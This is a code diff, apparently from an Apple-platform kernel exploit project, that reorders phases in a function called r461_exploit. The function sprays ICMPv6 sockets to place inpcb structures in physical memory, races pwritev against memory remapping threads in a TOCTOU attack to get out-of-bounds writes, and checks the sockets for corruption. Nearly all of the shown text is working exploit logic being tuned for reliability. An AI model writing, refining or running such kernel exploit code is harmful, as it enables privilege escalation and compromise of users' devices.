@@ -17342,6 +17342,30 @@ static void r461_exploit(void) {
 
     pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
 
+    /* Phase 0: Open F_NOCACHE file FIRST (before sockets eat all FDs) */
+    rlog("  --- Phase 0: F_NOCACHE file (%d bytes) ---\n", R461_SURF_SZ);
+    fflush(stdout);
+    char tmppath[256];
+    const char *tmpdir = getenv("TMPDIR");
+    int fd = -1;
+    if (tmpdir) {
+        snprintf(tmppath, sizeof(tmppath), "%s/r461_oob", tmpdir);
+        fd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0600);
+    }
+    if (fd < 0) {
+        snprintf(tmppath, sizeof(tmppath), "/private/var/tmp/r461_oob_%d", getpid());
+        fd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0600);
+    }
+    if (fd < 0) {
+        rlog("    FAILED to open file (errno=%d)\n", errno);
+        rlog("\n=== r461 complete ===\n"); return;
+    }
+    fcntl(fd, F_NOCACHE, 1);
+    char *zbuf = (char *)calloc(1, R461_SURF_SZ);
+    pwrite(fd, zbuf, R461_SURF_SZ, 0);
+    free(zbuf);
+    rlog("    File ready: fd=%d path=%s\n", fd, tmppath);
+
     /* Phase 1: ICMPv6 spray — fill physical pages with inpcb structs */
     rlog("  --- Phase 1: ICMPv6 spray (%d sockets) ---\n", R461_ICMP_SPRAY);
     fflush(stdout);
@@ -17443,38 +17467,8 @@ static void r461_exploit(void) {
     }
     free(frag_pages);
 
-    /* Phase 5: F_NOCACHE file for pwritev */
-    rlog("\n  --- Phase 5: F_NOCACHE file (%d bytes) ---\n", R461_SURF_SZ);
-    fflush(stdout);
-    char tmppath[256];
-    const char *tmpdir = getenv("TMPDIR");
-    int fd = -1;
-    if (tmpdir) {
-        snprintf(tmppath, sizeof(tmppath), "%s/r461_oob", tmpdir);
-        fd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0600);
-    }
-    if (fd < 0) {
-        snprintf(tmppath, sizeof(tmppath), "/private/var/tmp/r461_oob_%d", getpid());
-        fd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0600);
-    }
-    if (fd < 0) {
-        snprintf(tmppath, sizeof(tmppath), "/tmp/r461_oob_%d", getpid());
-        fd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0600);
-    }
-    if (fd < 0) {
-        rlog("    FAILED to open file (TMPDIR=%s errno=%d)\n", tmpdir ?: "NULL", errno);
-        for (int i = 0; i < icmp_count; i++) close(icmp_fds[i]);
-        free(icmp_fds); CFRelease(surf);
-        rlog("\n=== r461 complete ===\n"); return;
-    }
-    fcntl(fd, F_NOCACHE, 1);
-    char *zbuf = (char *)calloc(1, R461_SURF_SZ);
-    pwrite(fd, zbuf, R461_SURF_SZ, 0);
-    free(zbuf);
-    rlog("    File ready: fd=%d path=%s\n", fd, tmppath);
-
-    /* Phase 6: TOCTOU race with pwritev (memory→file) */
-    rlog("\n  --- Phase 6: TOCTOU race + pwritev (%d iters) ---\n", R461_ITERS);
+    /* Phase 5: TOCTOU race with pwritev (memory→file) */
+    rlog("\n  --- Phase 5: TOCTOU race + pwritev (%d iters) ---\n", R461_ITERS);
     fflush(stdout);
 
     struct r461_ctx ctxs[R461_REMAP_THREADS];
@@ -17588,8 +17582,8 @@ static void r461_exploit(void) {
     rlog("\n    Race complete: race_hits=%d, oob_hits=%d / %d iters, remaps=%d\n",
          race_hits, oob_hits, R461_ITERS, total_remaps);
 
-    /* Phase 7: ICMPv6 corruption check */
-    rlog("\n  --- Phase 7: ICMPv6 corruption check ---\n"); fflush(stdout);
+    /* Phase 6: ICMPv6 corruption check */
+    rlog("\n  --- Phase 6: ICMPv6 corruption check ---\n"); fflush(stdout);
     int corrupted = 0;
     for (int i = 0; i < icmp_count; i++) {
         struct icmp6_filter filt;
